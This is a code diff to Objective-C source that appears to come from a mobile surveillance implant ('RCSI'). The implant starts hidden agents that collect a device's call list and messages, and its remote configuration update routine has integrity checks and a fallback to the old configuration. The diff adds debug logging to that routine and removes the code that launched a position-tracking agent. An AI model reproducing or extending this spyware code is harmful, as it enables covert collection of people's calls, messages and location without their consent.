@@ -189,20 +189,38 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
 - (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
 {
-#ifdef DEBUG
+#ifdef DEBUG_CONF_MANAGER
   NSLog(@"Writing the new configuration");
 #endif
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: gConfigurationUpdateName] == TRUE)
     {
-#ifdef DEBUG
+#ifdef DEBUG_CONF_MANAGER
       NSLog(@"updateConfiguration: removing old config file");
 #endif
-      [[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName error: nil];
+      NSError *rmErr;
+      
+      if (![[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName error: &rmErr])
+      {
+#ifdef DEBUG_CONF_MANAGER
+        infoLog(@"Error remove file configuration %@", rmErr);
+#endif
+      }
     }
   
-  [aConfigurationData writeToFile: gConfigurationUpdateName
-                       atomically: YES];
+  if ([aConfigurationData writeToFile: gConfigurationUpdateName
+                       atomically: YES])
+  {
+#ifdef DEBUG_CONF_MANAGER
+    infoLog(@"file configuration write correctly");
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_CONF_MANAGER
+    infoLog(@"Error writing file configuration");
+#endif
+  }
   
   if ([mConfigManager checkConfigurationIntegrity: gConfigurationUpdateName])
     {
@@ -217,6 +235,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                                       toPath: gConfigurationName
                                                        error: nil])
             {
+#ifdef DEBUG_CONF_MANAGER
+              infoLog(@"moving new file configuration");
+#endif
               mShouldReloadConfiguration = YES;
               return TRUE;
             }
@@ -226,7 +247,10 @@ extern RCSISharedMemory *mSharedMemoryCommand;
     {
       [[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName
                                                  error: nil];
-
+#ifdef DEBUG_CONF_MANAGER
+      infoLog(@"Error moving new file configuration");
+#endif
+      
       RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
       [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
       [infoManager release];
@@ -762,7 +786,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
         break;
       }
     case AGENT_CALL_LIST:
-      {
+      {   
 #ifdef DEBUG
         NSLog(@"Starting Agent Call List");
 #endif
@@ -785,32 +809,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
 #ifdef DEBUG
             NSLog(@"Agent Messages is already running");
-#endif
-          }
-        break;
-      }
-    case AGENT_POSITION:
-      {
-#ifdef DEBUG
-        NSLog(@"Starting Agent Position");
-#endif
-        RCSIAgentPosition *agentPosition = [RCSIAgentPosition sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
-          {
-            [agentConfiguration setObject: AGENT_START forKey: @"status"];
-            agentPosition.mAgentConfiguration = agentConfiguration;
-            
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentPosition
-                                   withObject: nil];
-          }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Position is already running");
 #endif
           }
         break;
@@ -1433,34 +1431,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [NSThread detachNewThreadSelector: @selector(start)
                                          toTarget: agentCallList
                                        withObject: nil];
-                break;
-              }
-            case AGENT_POSITION:
-              {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Position");
-#endif
-                RCSIAgentPosition *agentPosition = [RCSIAgentPosition sharedInstance];
-                agentConfiguration = [[anObject objectForKey: @"data"] retain];
-                
-                if ([agentConfiguration isKindOfClass: [NSString class]])
-                  {
-                    // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config for Position not found");
-#endif
-                    break;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_START forKey: @"status"];
-                    agentPosition.mAgentConfiguration = anObject;
-                    
-                    [NSThread detachNewThreadSelector: @selector(start)
-                                             toTarget: agentPosition
-                                           withObject: nil];
-                  }
-                  
                 break;
               }
             default:
